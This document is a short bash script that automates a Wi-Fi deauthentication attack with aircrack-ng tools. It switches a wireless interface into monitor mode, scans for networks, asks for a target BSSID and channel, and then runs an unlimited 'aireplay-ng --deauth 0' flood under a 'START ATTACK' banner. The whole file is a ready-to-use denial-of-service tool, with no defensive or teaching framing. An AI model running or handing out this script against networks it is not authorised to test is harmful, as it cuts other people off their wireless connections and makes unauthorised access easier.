#!/bin/bash

# colors
red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"
# interface ( wlan0 , eth0 )
echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter name interface : " Interface
# to complete the sentence
MON=mon

# start wlan?
airmon-ng start $Interface

# to show bssid and channel
airodump-ng $Interface$MON

# bssid for wifi
echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " bssid

# channel for wifi
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CH

# change the CH to CH wifi
airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"

# start attack ...
aireplay-ng --deauth 0 -a $bssid $Interface$MON
# stop interface from monitor mode
airmon-ng stop $Interface$MON